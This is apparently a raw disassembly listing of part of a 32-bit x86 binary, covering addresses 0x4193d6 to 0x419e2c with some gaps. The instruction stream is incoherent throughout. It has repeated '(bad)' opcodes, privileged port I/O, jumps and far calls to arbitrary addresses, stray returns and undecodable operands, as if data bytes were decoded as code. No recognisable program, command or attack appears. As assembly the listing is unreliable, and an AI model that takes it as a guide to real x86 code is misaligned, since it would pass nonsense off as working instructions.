  4193d6:	in     al,dx
  4193d7:	inc    eax
  4193d8:	mov    ecx,0x202b13c5
  4193dd:	sbb    ebx,DWORD PTR [edi+0x6d]
  4193e0:	inc    ebp
  4193e1:	push   ebp
  4193e2:	mov    WORD PTR [esi],ds
  4193e4:	mov    eax,ds:0xf49ef8bd
  4193e9:	adc    esi,DWORD PTR [eax-0x2f09c7bb]
  4193ef:	mov    bl,0xc4
  4193f1:	push   0xffffffb1
  4193f3:	or     eax,0xcbf4738f
  4193f8:	and    dl,dl
  4193fa:	pusha  
  4193fb:	pop    ebx
  4193fc:	and    BYTE PTR [ebx-0x55],dh
  4193ff:	pop    ecx
  419400:	imul   ebx,DWORD PTR [eax+ebp*8-0xc],0xfffffff8
  419405:	fnsave [eax+ecx*8+0x67]
  419409:	jmp    0x87df34c1
  41940e:	adc    eax,0x33b9239a
  419413:	lea    esp,[edx-0x58543081]
  419419:	cmp    DWORD PTR [eax-0x4d4282f3],0xffffff90
  419420:	ins    DWORD PTR es:[edi],dx
  419421:	iret   
  419422:	or     BYTE PTR [ecx-0x7e],ch
  419425:	adc    DWORD PTR [esi],ebp
  419427:	sub    al,0xc
  419429:	out    0x5a,al
  41942b:	ffreep st(3)
  41942d:	fdiv   DWORD PTR [esi+0x3]
  419430:	push   eax
  419431:	(bad)  
  419432:	mov    al,ds:0x9a6a876f
  419437:	jp     0x41945d
  419439:	sbb    WORD PTR [edi],di
  41943c:	xchg   BYTE PTR [esi],ah
  41943e:	jmp    FWORD PTR [edi]
  419440:	push   0xffffff9a
  419442:	push   DWORD PTR [ecx-0x2e8435c4]
  419448:	test   al,0x7f
  41944a:	nop
  41944b:	iret   
  41944c:	sub    bl,BYTE PTR [edx+esi*2+0x312a73c0]
  419453:	retf   
  419454:	iret   
  419455:	in     ax,dx
  419457:	push   ebp
  419458:	and    ah,0x8f
  41945b:	and    edx,DWORD PTR [edi]
  41945d:	loop   0x41942a
  41945f:	pop    ebp
  419460:	pop    ds
  419461:	inc    ebp
  419462:	xor    BYTE PTR [edx-0x5752e346],dh
  419468:	mov    bh,0x49
  41946a:	jo     0x4194bf
  41946c:	inc    edi
  41946d:	call   0x0:0x0
	...
  4194d4:	add    BYTE PTR [eax],al
  4194d6:	cmp    eax,0xed3a6998
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	outs   dx,DWORD PTR ds:[esi]
  4194e3:	cmp    eax,0x1067bc2d
  4194e8:	add    DWORD PTR [eax],eax
  4194ea:	add    BYTE PTR [ecx],al
  4194ec:	add    BYTE PTR [eax],al
  4194ee:	jmp    DWORD PTR [esi]
  4194f0:	cmp    cl,dh
  4194f2:	sahf   
  4194f3:	mov    dl,0xa6
  4194f5:	sti    
  4194f6:	shl    DWORD PTR [eax],1
  4194f8:	das    
  4194f9:	adc    BYTE PTR [ebp+edx*4+0x416f851d],0x4f
  419501:	inc    edi
  419502:	mov    ah,BYTE PTR [ecx]
  419504:	mov    dh,0x2f
  419506:	aaa    
  419507:	stos   DWORD PTR es:[edi],eax
  419508:	std    
  419509:	in     al,0xb7
  41950b:	jl     0x41951c
  41950d:	and    eax,0x4c24cd40
  419512:	push   ebx
  419513:	loopne 0x4194dd
  419515:	test   dh,bh
  419517:	push   ebp
  419518:	jp     0x419547
  41951a:	fwait
  41951b:	sub    dh,BYTE PTR [eax]
  41951d:	mov    cl,0x2a
  41951f:	es cs push edi
  419522:	mov    al,0x26
  419524:	inc    ecx
  419525:	adc    BYTE PTR [eax+0x6c],dl
  419528:	push   ebx
  419529:	or     bh,BYTE PTR [esi+0x3742a31f]
  41952f:	pop    edx
  419530:	ss hlt 
  419532:	jo     0x419580
  419534:	mov    dl,0x97
  419536:	sbb    ch,BYTE PTR [esi+0x14cce7b7]
  41953c:	mov    edi,?
  41953e:	xor    al,0xf0
  419540:	cli    
  419541:	in     eax,0x39
  419543:	xor    DWORD PTR ds:0xdac05aa6,esi
  419549:	test   BYTE PTR ds:0xc20bf71,bl
  41954f:	xchg   edi,eax
  419550:	dec    esi
  419551:	into   
  419552:	cmp    DWORD PTR [edi+0x25da945b],0x27d6f8d5
  41955c:	rol    edi,1
  41955e:	dec    ebp
  41955f:	mov    bh,0x70
  419561:	popf   
  419562:	out    0xb1,eax
  419564:	sahf   
  419565:	pop    ecx
  419566:	mov    bh,0xa3
  419568:	mov    al,ds:0xe5b59dc2
  41956d:	or     ah,BYTE PTR [esi]
  41956f:	add    DWORD PTR [ecx],esi
  419571:	mov    edi,0x4b31ac8e
  419576:	mov    ds:0x39dec1b4,eax
  41957b:	adc    eax,0xa82519cc
  419580:	popf   
  419581:	repz xor esp,DWORD PTR [ecx-0x56]
  419585:	jno    0x41959d
  419587:	pop    ds
  419588:	mov    WORD PTR [ebx],?
  41958a:	clc    
  41958b:	add    BYTE PTR [edx+0x719f62df],ch
  419591:	fbstp  TBYTE PTR [edx+0x71]
  419594:	dec    esi
  419595:	cwde   
  419596:	int    0x6f
  419598:	das    
  419599:	outs   dx,DWORD PTR ds:[esi]
  41959a:	mov    eax,0x77f8b19c
  41959f:	daa    
  4195a0:	lock dec ecx
  4195a2:	ret    0x30b4
  4195a5:	jecxz  0x4195fb
  4195a7:	stos   DWORD PTR es:[edi],eax
  4195a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195a9:	dec    ecx
  4195aa:	iret   
  4195ab:	and    BYTE PTR [ebx+0x4b6b6978],dl
  4195b1:	dec    edx
  4195b2:	mov    eax,0xf1310bc8
  4195b7:	add    BYTE PTR [ecx+0xe],al
  4195ba:	mov    BYTE PTR [ebp-0x38222771],al
  4195c0:	xchg   esp,eax
  4195c1:	push   ebp
  4195c2:	mov    ds:0x1a1be556,eax
  4195c7:	mov    al,0x99
  4195c9:	stos   DWORD PTR es:[edi],eax
  4195ca:	sub    DWORD PTR [ecx+0x2a],eax
  4195cd:	mov    esi,0xb137aec1
  4195d2:	push   esi
  4195d3:	push   ecx
  4195d4:	test   eax,0x6451a517
  4195d9:	aad    0xe9
  4195db:	and    dh,BYTE PTR [ebx]
  4195dd:	or     al,0xfc
  4195df:	loope  0x4195f6
  4195e1:	outs   dx,BYTE PTR ds:[esi]
  4195e2:	cmp    esp,ebx
  4195e4:	fistp  WORD PTR [ebp-0x5f]
  4195e7:	lods   al,BYTE PTR ds:[esi]
  4195e8:	arpl   WORD PTR [ecx+esi*8+0x1],di
  4195ec:	jnp    0x41964b
	...
  419656:	scas   eax,DWORD PTR es:[edi]
  419657:	aam    0x8d
  419659:	(bad)  
  41965a:	(bad)  
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	xor    BYTE PTR [edx+0xa],cl
  419665:	popf   
  419666:	adc    DWORD PTR [bx+di],eax
  419669:	add    BYTE PTR [eax],al
  41966b:	add    DWORD PTR [eax],eax
  41966d:	add    BYTE PTR [eax-0xc1aa3c1],ch
  419673:	mul    BYTE PTR [edx]
  419675:	sub    al,0x51
  419677:	mov    al,ds:0xd2cbab1a
  41967c:	or     al,0xd3
  41967e:	sub    al,0x24
  419680:	sbb    ebp,edi
  419682:	and    eax,0x59df1f30
  419687:	jle    0x419701
  419689:	jb     0x419612
  41968b:	loopne 0x41970c
  41968d:	hlt    
  41968e:	in     al,dx
  41968f:	jmp    0x34ea466d
  419694:	push   0xffffffc1
  419696:	fist   WORD PTR [eax+ecx*1]
  419699:	add    dh,BYTE PTR [edx+0x66e02e0]
  41969f:	or     eax,0xfbf51eaa
  4196a4:	mov    eax,ds:0xeec78f2b
  4196a9:	pop    esi
  4196aa:	loop   0x41963b
  4196ac:	aaa    
  4196ad:	cdq    
  4196ae:	xchg   edx,eax
  4196af:	mov    eax,0x8b0263ad
  4196b4:	(bad)  
  4196b6:	in     eax,0x23
  4196b8:	jmp    0x419728
  4196ba:	jg     0x4196c5
  4196bc:	arpl   WORD PTR [ebx+0x1cf2a195],ax
  4196c2:	scas   al,BYTE PTR es:[edi]
  4196c3:	cmp    dh,BYTE PTR [esi-0x17]
  4196c6:	or     bh,bh
  4196c8:	add    BYTE PTR [ecx+0x4e],dl
  4196cb:	mov    al,ds:0x749154b7
  4196d0:	adc    al,0x1d
  4196d2:	sub    eax,0xe6728f51
  4196d7:	mov    bh,0x25
  4196d9:	cmp    BYTE PTR [ecx-0x7fc1ccb4],cl
  4196df:	ins    DWORD PTR es:[edi],dx
  4196e0:	jb     0x4196af
  4196e2:	adc    DWORD PTR [ebx],eax
  4196e4:	jmp    DWORD PTR [ebp+0x273f16]
  4196ea:	ja     0x4196dc
  4196ec:	xchg   BYTE PTR [ecx+0x49],al
  4196ef:	adc    BYTE PTR [eax+0x23dd8891],cl
  4196f5:	retf   
  4196f6:	js     0x419737
  4196f8:	loopne 0x41976d
  4196fa:	lods   eax,DWORD PTR ds:[esi]
  4196fb:	xchg   BYTE PTR [ebx+0x65],al
  4196fe:	test   DWORD PTR [ebx],eax
  419700:	pop    ds
  419701:	cmp    esi,DWORD PTR [eax-0x1ff40d1f]
  419707:	jne    0x4196ec
  419709:	dec    edi
  41970a:	pop    ebx
  41970b:	pusha  
  41970c:	xchg   ebp,eax
  41970d:	fcmovnu st,st(4)
  41970f:	outs   dx,BYTE PTR ds:[esi]
  419710:	cmp    al,0x19
  419712:	fcmovnbe st,st(7)
  419714:	ret    
  419715:	loop   0x4196e0
  419717:	scas   al,BYTE PTR es:[edi]
  419718:	les    ebx,FWORD PTR [edi-0x8939b2d]
  41971e:	in     eax,0x77
  419720:	cs jb  0x4196a5
  419723:	add    al,0xb6
  419725:	inc    edx
  419726:	in     al,0xdd
  419728:	add    al,0xbd
  41972a:	enter  0x6eae,0xce
  41972e:	cmc    
  41972f:	or     edx,edx
  419731:	mov    BYTE PTR [ebx+0x136fd112],cl
  419737:	jae    0x4196dd
  419739:	sbb    ebp,DWORD PTR [ebp-0x67]
  41973c:	sbb    DWORD PTR [ecx-0x68f8cf3e],esp
  419742:	out    0x64,al
  419744:	sti    
  419745:	int3   
  419746:	loope  0x4196f7
  419748:	call   0x9f82b35e
  41974d:	push   es
  41974e:	into   
  41974f:	mov    eax,0x6e790580
  419754:	sbb    esp,DWORD PTR [edx-0x10]
  419757:	adc    ch,ah
  419759:	push   cs
  41975a:	mov    bh,0x8b
  41975c:	mov    bl,0xe8
  41975e:	shl    ecx,cl
  419760:	scas   al,BYTE PTR es:[edi]
  419761:	jmp    0x4197b0
  419763:	sub    BYTE PTR [ebx+0x20a9f31f],ch
  419769:	inc    edx
  41976a:	test   eax,0xf9ba1e
	...
  4197d3:	add    BYTE PTR [eax],al
  4197d5:	add    BYTE PTR [ebx-0x29a8ec1],dh
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0xf18dd0ae
  4197e3:	arpl   WORD PTR [eax],bp
  4197e5:	xor    ah,BYTE PTR [edi+0x12]
  4197e8:	add    DWORD PTR [eax],eax
  4197ea:	add    BYTE PTR [ecx],al
  4197ec:	add    BYTE PTR [eax],al
  4197ee:	fmul   DWORD PTR [edi]
  4197f0:	mov    edi,0x22a5ace6
  4197f5:	dec    edi
  4197f6:	mov    ds:0x2648446a,al
  4197fb:	dec    ecx
  4197fc:	lods   al,BYTE PTR ds:[esi]
  4197fd:	or     DWORD PTR [ecx],esp
  4197ff:	adc    al,0x26
  419801:	pop    ds
  419802:	jecxz  0x4197fc
  419804:	cmp    cl,BYTE PTR [edx+esi*2]
  419807:	push   ebp
  419808:	or     dh,BYTE PTR ds:0x7f8c8de7
  41980e:	in     eax,dx
  41980f:	push   esi
  419810:	daa    
  419811:	pop    ebp
  419812:	or     edi,DWORD PTR ss:[ebx]
  419815:	mov    esp,0x8969782c
  41981a:	sub    ebp,ebp
  41981c:	mov    eax,ds:0x8e41522
  419821:	enter  0x64c0,0xac
  419825:	cs clc 
  419827:	addr16 mov eax,0xe0241fe5
  41982d:	dec    eax
  41982e:	jne    0x419858
  419830:	nop
  419831:	xlat   BYTE PTR ds:[ebx]
  419832:	cmp    al,0x86
  419834:	int    0xac
  419836:	sub    al,ch
  419838:	repz pop edi
  41983a:	and    al,0xd8
  41983c:	add    BYTE PTR [ecx+eax*1+0x2d5376cf],ah
  419843:	xchg   ecx,eax
  419844:	push   ebp
  419845:	mov    ah,0x35
  419847:	dec    ebp
  419848:	dec    ecx
  419849:	nop
  41984a:	repz inc ebx
  41984c:	mov    esi,0x1d7192d1
  419851:	jecxz  0x41982f
  419853:	add    eax,esp
  419855:	retf   0xd379
  419858:	rcr    DWORD PTR [eax+0x7083fdec],1
  41985e:	rcr    BYTE PTR [edi],0x5d
  419861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419862:	inc    ebx
  419863:	mov    ebp,0xa1681e9d
  419868:	mov    al,0x4c
  41986a:	rcl    ch,0x7f
  41986d:	jp     0x4198ae
  41986f:	daa    
  419870:	xor    BYTE PTR [eax+0x3587c85],ah
  419876:	sbb    DWORD PTR [edx+edx*2+0x408aa84c],eax
  41987d:	adc    dh,BYTE PTR [esi]
  41987f:	mov    edi,0xe92f758d
  419884:	call   0x188bd61b
  419889:	or     ebp,DWORD PTR [ebx+0x5f]
  41988c:	pop    ecx
  41988d:	jae    0x419905
  41988f:	mov    cl,0xa2
  419891:	xor    bl,ah
  419893:	jmp    0x4198eb
  419895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419896:	pop    es
  419897:	leave  
  419898:	xchg   edi,eax
  419899:	cmp    BYTE PTR ds:0xb889ba0e,ah
  41989f:	add    eax,0xe90a1acb
  4198a4:	addr16 jnp 0x4198dd
  4198a7:	imul   ebx,esp,0x77
  4198aa:	jb     0x4198a6
  4198ac:	es pusha 
  4198ae:	inc    edi
  4198af:	push   0xde0dde94
  4198b4:	pop    esi
  4198b5:	pop    ds
  4198b6:	hlt    
  4198b7:	test   DWORD PTR [ebx+ebp*8],0xee131c32
  4198be:	and    BYTE PTR [ecx],al
  4198c0:	inc    ecx
  4198c1:	dec    edx
  4198c2:	mov    dl,0x26
  4198c4:	cmp    DWORD PTR [esi+ebp*8+0x6a8fcaf3],edx
  4198cb:	es mov cl,0xd6
  4198ce:	push   edi
  4198cf:	cmc    
  4198d0:	retf   0x3f77
  4198d3:	xchg   edi,eax
  4198d4:	rol    BYTE PTR [ebx],1
  4198d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198d7:	sbb    al,0xb3
  4198d9:	std    
  4198da:	aas    
  4198db:	out    0xae,eax
  4198dd:	sbb    bl,BYTE PTR [edx]
  4198df:	stos   BYTE PTR es:[edi],al
  4198e0:	add    dh,cl
  4198e2:	xchg   edx,eax
  4198e3:	out    dx,al
  4198e4:	inc    ebp
  4198e5:	rcl    DWORD PTR ds:0xa11a2d42,1
  4198eb:	fdivrp st(4),st
  4198ed:	pushf  
	...
  419956:	sbb    BYTE PTR [ecx],0x47
  419959:	loope  0x41993a
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	fld    QWORD PTR [eax]
  419963:	xor    BYTE PTR [eax],ah
  419965:	cld    
  419966:	adc    eax,DWORD PTR [bx+di]
  419969:	add    BYTE PTR [eax],al
  41996b:	add    DWORD PTR [eax],eax
  41996d:	add    BYTE PTR [edx-0x6f],cl
  419970:	add    esi,DWORD PTR [ebp-0x22]
  419973:	add    BYTE PTR ds:0xf6d2d436,dh
  419979:	retf   0x2f67
  41997c:	xchg   edx,eax
  41997d:	loope  0x41991c
  41997f:	data16 loopne 0x419990
  419982:	arpl   WORD PTR [ebp+0xe],bp
  419985:	mov    BYTE PTR [ecx-0x13],ch
  419988:	inc    ebx
  419989:	cmp    bh,BYTE PTR [ebx+0x6d9700e5]
  41998f:	add    DWORD PTR [eax-0x16aa59ee],esi
  419995:	cdq    
  419996:	pop    edx
  419997:	in     al,0xf7
  419999:	jecxz  0x4199b3
  41999b:	mul    esi
  41999d:	sbb    ebp,esi
  41999f:	sbb    BYTE PTR [esi+0x7d],bl
  4199a2:	sbb    dl,BYTE PTR [ebp-0xf7f1fbf]
  4199a8:	pop    ecx
  4199a9:	dec    eax
  4199aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199ab:	retf   0x2623
  4199ae:	jl     0x41993d
  4199b0:	add    ebx,DWORD PTR [ebx+0x3d]
  4199b3:	or     bh,BYTE PTR [ebp+0x43]
  4199b6:	icebp  
  4199b7:	lock ins BYTE PTR es:[edi],dx
  4199b9:	jp     0x419952
  4199bb:	(bad)  
  4199bc:	into   
  4199bd:	pushf  
  4199be:	out    0xb4,al
  4199c0:	addr16 push ecx
  4199c2:	sub    al,0xa4
  4199c4:	mov    WORD PTR [ebx],ds
  4199c6:	fcmovnb st,st(3)
  4199c8:	pop    esi
  4199c9:	stos   DWORD PTR es:[edi],eax
  4199ca:	test   dh,ah
  4199cc:	and    al,0x5c
  4199ce:	cwde   
  4199cf:	or     BYTE PTR [ecx+0x17],bl
  4199d2:	cli    
  4199d3:	out    dx,al
  4199d4:	mov    bl,0xbe
  4199d6:	jge    0x419a00
  4199d8:	fnstenv [esi+edx*4-0x41829fe5]
  4199df:	mov    ds:0xf64ca47a,al
  4199e4:	add    BYTE PTR [eax],al
  4199e6:	cli    
  4199e7:	stos   BYTE PTR es:[edi],al
  4199e8:	test   BYTE PTR [ebp+0x68f2f570],ch
  4199ee:	jle    0x4199eb
  4199f0:	(bad)  
  4199f2:	sub    ecx,esi
  4199f4:	jo     0x419a49
  4199f6:	and    eax,0xcb7e62c2
  4199fb:	lds    esi,FWORD PTR [ebp+0x12ef0b00]
  419a01:	sbb    BYTE PTR ds:0x587efc82,bl
  419a07:	push   eax
  419a08:	test   BYTE PTR [eax-0x25b69c14],ah
  419a0e:	or     eax,0xd18831a0
  419a13:	dec    ecx
  419a14:	pop    es
  419a15:	sbb    esi,DWORD PTR [edi-0x3a]
  419a18:	add    al,0xe
  419a1a:	adc    al,0x1d
  419a1c:	mov    gs,WORD PTR [esp+eax*1+0x33]
  419a20:	adc    ecx,DWORD PTR [ebp+0x4d]
  419a23:	fcomp  QWORD PTR [ebx-0x5d]
  419a26:	scas   eax,DWORD PTR es:[edi]
  419a27:	pop    ebp
  419a28:	cmp    eax,0xf93382fd
  419a2d:	sahf   
  419a2e:	mov    ds:0xec3cd72d,al
  419a33:	mov    al,0x56
  419a35:	mov    ebp,0x6f8a524a
  419a3a:	fcom   DWORD PTR [ebx]
  419a3c:	xchg   ecx,eax
  419a3d:	je     0x419a5c
  419a3f:	dec    ebx
  419a40:	dec    esp
  419a41:	ds adc al,0xe5
  419a44:	sub    BYTE PTR [ebx],bh
  419a46:	(bad)  
  419a48:	sahf   
  419a49:	or     dh,ch
  419a4b:	loop   0x419a9a
  419a4d:	xor    BYTE PTR [ebx],dh
  419a4f:	scas   eax,DWORD PTR es:[edi]
  419a50:	test   BYTE PTR [edi],0xd4
  419a53:	pop    ecx
  419a54:	daa    
  419a55:	fs out 0x69,eax
  419a58:	mov    dl,0xe3
  419a5a:	inc    edx
  419a5b:	fsubr  DWORD PTR [ebx+0xb]
  419a5e:	adc    cl,BYTE PTR [eax+0x33a6e9f4]
  419a64:	pop    eax
  419a65:	push   ss
  419a66:	leave  
  419a67:	fmul   st(1),st
  419a69:	and    DWORD PTR [esi-0x49],edi
  419a6c:	jge    0x419ac6
	...
  419ad6:	xor    esi,DWORD PTR [ecx]
  419ad8:	xchg   ebx,eax
  419ad9:	lds    edx,FWORD PTR [ebx-0x34088819]
  419adf:	rcl    DWORD PTR ds:0x99d365c2,cl
  419ae5:	pop    eax
  419ae6:	addr16 adc al,0x1
  419ae9:	add    BYTE PTR [eax],al
  419aeb:	add    DWORD PTR [eax],eax
  419aed:	add    dh,cl
  419aef:	je     0x419b3e
  419af1:	mov    eax,ds:0xc90d13e4
  419af6:	dec    ebx
  419af7:	scas   al,BYTE PTR es:[edi]
  419af8:	push   eax
  419af9:	sahf   
  419afa:	inc    eax
  419afb:	and    al,0x5e
  419afd:	mov    dh,0x8a
  419aff:	fisttp QWORD PTR [ebp+eiz*4-0x577f47bf]
  419b06:	in     eax,0xf1
  419b08:	or     dh,al
  419b0a:	fisttp DWORD PTR [eax]
  419b0c:	fiadd  WORD PTR [ebp+0x44]
  419b0f:	cmp    bl,dl
  419b11:	out    0x26,al
  419b13:	pop    ss
  419b14:	sbb    eax,0xa6330989
  419b19:	(bad)  
  419b1a:	ffreep st(3)
  419b1c:	cmp    eax,0xbf1f16cd
  419b21:	pop    edi
  419b22:	push   ds
  419b23:	cs mov bl,0x54
  419b26:	pop    ecx
  419b27:	imul   ecx,DWORD PTR [ebp-0x201b4593],0xffffffd4
  419b2e:	cli    
  419b2f:	sub    ebp,ebx
  419b31:	dec    edi
  419b32:	push   edx
  419b33:	bound  esp,QWORD PTR [eax+ebp*8-0x6811e6c7]
  419b3a:	pushf  
  419b3b:	lods   al,BYTE PTR ds:[esi]
  419b3c:	test   BYTE PTR [edx-0x6329a58d],ch
  419b42:	popf   
  419b43:	lea    edi,[edx+0x67]
  419b46:	clc    
  419b47:	int3   
  419b48:	or     eax,0x721734f
  419b4d:	and    al,0xff
  419b4f:	ss inc ebx
  419b52:	inc    ecx
  419b53:	ret    
  419b54:	xlat   BYTE PTR ds:[ebx]
  419b55:	push   edx
  419b56:	les    edx,FWORD PTR [esi]
  419b58:	cli    
  419b59:	xor    ch,cl
  419b5b:	dec    esi
  419b5c:	push   eax
  419b5d:	pop    ebp
  419b5e:	push   eax
  419b5f:	lods   eax,DWORD PTR ds:[esi]
  419b60:	and    DWORD PTR [edi+0x69b02b42],ebp
  419b66:	push   ebp
  419b67:	fabs   
  419b69:	(bad)  
  419b6a:	repnz clc 
  419b6c:	(bad)  
  419b6d:	fcom   QWORD PTR ds:0xe07172bb
  419b73:	loop   0x419b6f
  419b75:	nop
  419b76:	adc    al,0xf8
  419b78:	test   BYTE PTR [eax+esi*4-0x48],ah
  419b7c:	push   esi
  419b7d:	pop    edi
  419b7e:	lea    ecx,[esi+0x4]
  419b81:	outs   dx,DWORD PTR ds:[esi]
  419b82:	or     al,0x74
  419b84:	outs   dx,DWORD PTR ds:[esi]
  419b85:	iret   
  419b86:	dec    ebp
  419b87:	dec    ebp
  419b88:	jo     0x419bc5
  419b8a:	push   ecx
  419b8b:	imul   edx,DWORD PTR [ecx],0x921801cd
  419b91:	push   es
  419b92:	mov    edx,0x97025ad1
  419b97:	ja     0x419b57
  419b99:	mov    ds:0x8c952752,al
  419b9e:	stc    
  419b9f:	idiv   DWORD PTR [ebp-0x5a70018b]
  419ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ba6:	cs mov edi,cs
  419ba9:	mov    WORD PTR ds:0xe5c1d23f,?
  419baf:	dec    ecx
  419bb0:	ret    0xfdcd
  419bb3:	(bad)  
  419bb4:	pop    ss
  419bb5:	sahf   
  419bb6:	aad    0xea
  419bb8:	add    ah,BYTE PTR [eax-0x4d]
  419bbb:	lods   eax,DWORD PTR ds:[esi]
  419bbc:	or     ebx,DWORD PTR [edi+0x686108f1]
  419bc2:	push   ds
  419bc3:	out    dx,eax
  419bc4:	push   esi
  419bc5:	sbb    al,cl
  419bc7:	pop    ds
  419bc8:	lods   al,BYTE PTR ds:[esi]
  419bc9:	not    ebx
  419bcb:	push   0xffffff94
  419bcd:	mov    cl,0x4
  419bcf:	lahf   
  419bd0:	pop    eax
  419bd1:	cmp    al,ch
  419bd3:	sub    BYTE PTR [eax],al
  419bd5:	test   eax,0xd7efb13e
  419bda:	leave  
  419bdb:	int3   
  419bdc:	popa   
  419bdd:	jne    0x419b96
  419bdf:	rcr    BYTE PTR [ecx],1
  419be1:	popa   
  419be2:	mov    bl,BYTE PTR ds:0xaa6e93d7
  419be8:	scas   al,BYTE PTR es:[edi]
  419be9:	gs je  0x419bf7
  419bec:	imul   ebp,DWORD PTR ds:0x0,0x0
	...
  419c53:	add    BYTE PTR [eax],al
  419c55:	add    BYTE PTR [edx-0x3c],cl
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0xcc
  419c63:	cs loope 0x419bf1
  419c66:	addr16 adc eax,0x1000001
  419c6c:	add    BYTE PTR [eax],al
  419c6e:	push   ebp
  419c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c70:	adc    DWORD PTR [edx],0xbfa5c41c
  419c76:	cld    
  419c77:	add    DWORD PTR [ebx+0x4f],0x2bfbc35b
  419c7e:	aad    0xb1
  419c80:	xor    BYTE PTR ds:0x2a709001,dl
  419c86:	mov    dh,0xb3
  419c88:	and    BYTE PTR [edi+0x66],0x3f
  419c8c:	rcr    DWORD PTR [edi-0x55],1
  419c8f:	gs ins DWORD PTR es:[edi],dx
  419c91:	js     0x419d0f
  419c93:	inc    edx
  419c94:	imul   ebp,DWORD PTR [edi-0x7d],0xffffff8e
  419c98:	and    cl,BYTE PTR [ebx-0x7b]
  419c9b:	mov    ah,0xe
  419c9d:	sub    ch,BYTE PTR cs:[edx+0x14]
  419ca1:	arpl   WORD PTR [edx+0x75],dx
  419ca4:	mov    ebp,0x132eeb42
  419ca9:	mov    eax,0x708f7000
  419cae:	outs   dx,BYTE PTR ds:[esi]
  419caf:	cmp    eax,0xf170dbe
  419cb4:	cmp    eax,0x7f13384d
  419cb9:	pusha  
  419cba:	push   eax
  419cbb:	out    0xed,al
  419cbd:	xchg   ebx,eax
  419cbe:	(bad)
  419cc3:	push   eax
  419cc4:	aad    0x34
  419cc6:	pop    edi
  419cc7:	or     al,0xf4
  419cc9:	call   0x1d231c2c
  419cce:	imul   esi,DWORD PTR [ecx+ebp*1],0x8df60419
  419cd5:	dec    ebx
  419cd6:	daa    
  419cd7:	cli    
  419cd8:	mov    esi,0xbd4d3891
  419cdd:	inc    esp
  419cde:	jae    0x419cce
  419ce0:	mov    ebp,0x6cce42e4
  419ce5:	push   ebx
  419ce6:	les    esi,FWORD PTR [ebp+eax*2+0x2cc58efe]
  419ced:	mov    bh,0x6f
  419cef:	jp     0x419c72
  419cf1:	in     al,dx
  419cf2:	fld    QWORD PTR [edi]
  419cf4:	pop    ecx
  419cf5:	je     0x419c9d
  419cf7:	dec    ecx
  419cf8:	push   edi
  419cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cfa:	ins    DWORD PTR es:[edi],dx
  419cfb:	mov    dh,0x1
  419cfd:	mov    edi,0x3a60ed1
  419d02:	pop    es
  419d03:	pop    ss
  419d04:	push   esp
  419d05:	jno    0x419d06
  419d07:	lods   al,BYTE PTR ds:[esi]
  419d08:	cmp    bl,BYTE PTR [eax]
  419d0a:	mov    BYTE PTR [ebx+0x76],dh
  419d0d:	out    0xd7,eax
  419d0f:	mov    ds:0xaeb6d8bc,eax
  419d14:	xor    DWORD PTR [edi+0x2744e942],esp
  419d1a:	pop    ds
  419d1b:	jmp    0x9fac:0x81482d5e
  419d22:	scas   eax,DWORD PTR es:[edi]
  419d23:	mov    esp,0x86bb6d31
  419d28:	and    edi,DWORD PTR [ebx]
  419d2a:	mov    edi,0x9242e264
  419d2f:	mov    ecx,0x638541f6
  419d34:	ret    0xe303
  419d37:	lahf   
  419d38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d39:	mov    bl,BYTE PTR [ecx+0x5e]
  419d3c:	sar    DWORD PTR [ebx+0x45],0x8
  419d40:	out    0xe9,eax
  419d42:	cmp    eax,0x398f29f8
  419d47:	sub    al,0xf1
  419d49:	sub    eax,0xe73fea5e
  419d4e:	outs   dx,DWORD PTR ds:[esi]
  419d4f:	cmc    
  419d50:	push   ecx
  419d51:	add    ebx,ebx
  419d53:	stc    
  419d54:	mov    bh,0x99
  419d56:	stos   DWORD PTR es:[edi],eax
  419d57:	in     eax,0x99
  419d59:	lds    eax,FWORD PTR [esi+0x735bc0d4]
  419d5f:	bound  esp,QWORD PTR [ecx-0x52]
  419d62:	dec    ecx
  419d63:	inc    edx
  419d64:	mov    al,ds:0x7586bb2e
  419d69:	inc    ebp
  419d6a:	mov    esi,0xabf8a7
	...
  419dd3:	add    BYTE PTR [eax],al
  419dd5:	add    al,dh
  419dd7:	xchg   edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	fisub  DWORD PTR ss:[ecx+0x6783b3bb]
  419de7:	push   ss
  419de8:	add    DWORD PTR [eax],eax
  419dea:	add    BYTE PTR [ecx],al
  419dec:	add    BYTE PTR [eax],al
  419dee:	mov    bl,BYTE PTR [eax+0x118236c4]
  419df4:	mov    cl,dh
  419df6:	shr    BYTE PTR [ebx+0x7e],0x4e
  419dfa:	stos   DWORD PTR es:[edi],eax
  419dfb:	shr    DWORD PTR [ebp-0x4895b9df],cl
  419e01:	push   edx
  419e02:	into   
  419e03:	xchg   ebp,eax
  419e04:	and    DWORD PTR [esi-0x2bec9a8],edi
  419e0a:	in     al,0xa3
  419e0c:	arpl   WORD PTR [edx-0xe294fc3],si
  419e12:	les    edi,FWORD PTR [edi+0x11]
  419e15:	inc    esp
  419e16:	std    
  419e17:	ret    0xe0e
  419e1a:	inc    eax
  419e1b:	sbb    eax,0x2182eea
  419e20:	cmp    dl,BYTE PTR cs:[edi]
  419e23:	cmp    edi,DWORD PTR [edx]
  419e25:	imul   edi,DWORD PTR [ecx-0x12eb94ef],0x78
  419e2c:	or     BYTE PTR [ebx],0x35
